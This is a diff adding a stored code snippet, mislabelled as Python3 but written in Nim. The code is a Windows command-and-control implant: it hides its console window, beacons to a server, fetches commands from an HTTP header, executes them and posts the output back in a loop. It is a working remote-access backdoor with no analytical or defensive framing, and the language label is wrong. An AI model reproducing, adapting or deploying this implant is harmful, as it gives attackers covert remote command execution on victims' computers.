@@ -1,0 +1,89 @@
+---
+id: 7bb78fec-f724-4427-bc21-1b31f6145c62
+type: code
+language: Python3
+verified: false
+created_at: '2023-06-06T03:12:44.558248+00:00'
+updated_at: '2023-06-06T03:13:11.598800+00:00'
+---
+
+# Code Snippet 7bb78fec
+
+**Language**: Python3
+
+```python3
+import std/[httpclient, json]
+import std/osproc
+import std/md5
+import std/os
+import std/strutils
+import Winim
+import std/times
+import std/registry
+
+const server = "http://127.0.0.1"
+const defUserAgent = "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion"
+
+let Name = getTime()
+var Outp_shell_md5 = toMD5($Name) #MD5 the output
+let Outp_shell_md5_string = $Outp_shell_md5 #Change to variable
+#echo Outp_shell_md5_string
+var sendcommand = newHttpClient(userAgent= defUserAgent) #Create Connection
+sendcommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
+let sent = sendcommand.request(server & "/index", httpMethod = HttpGet)
+#echo sent.status
+const SLEEP = 5000
+
+#Background Window
+proc Stealth() =
+  var Stealth: HWND
+  discard AllocConsole()
+  Stealth = FindWindowA("ConsoleWindowClass", nil);
+  discard ShowWindow(Stealth,0)
+
+Stealth()
+
+proc die() =
+  quit QuitFailure
+
+while true: #Maintain Connection
+    let sleeptime = SLEEP #Sleep Time
+    sleep(sleeptime)
+    var GetCommand = newHttpClient(userAgent= defUserAgent)
+    GetCommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
+    let sent = GetCommand.request(server & "/cmd", httpMethod = HttpGet)
+    #echo sent.status
+    let response = sent.headers
+    let cmd = response.getOrDefault("X-cmd") # Check for Command
+    let event_id = response.getOrDefault("x-event-id") # Check for event ID
+    let jitter = response.getOrDefault("x-jitter")
+    #echo cmd 
+
+    if cmd != "None": #If X-cmd is not empty, execute
+      if cmd == "quit":
+        die()
+      else:
+        try:
+          let Outp_shell = execProcess(cmd)
+          let Outp_shell_string = $Outp_shell
+            #echo Outp_shell_string      
+          let client = newHttpClient()
+          client.headers = newHttpHeaders({ "Content-Type": "application/json", "Content-MD5": Outp_shell_md5_string,"x-event-id": $event_id })
+          let body = %*{
+              "data": Outp_shell_string
+          }
+          let response = client.request(server & "/cmd", httpMethod = HttpPost, body = $body)
+        except OSError:
+          let client = newHttpClient()
+          client.headers = newHttpHeaders({ "Content-Type": "application/json", "Content-MD5": Outp_shell_md5_string,"x-event-id": $event_id })
+          let body = %*{
+              "data": "No Response"
+          }
+          let response = client.request(server & "/cmd", httpMethod = HttpPost, body = $body)
+
+        #echo response.status
+    elif jitter != "None":
+        let sleeptime = response.getOrDefault("x-jitter")
+    else:
+        continue
+```
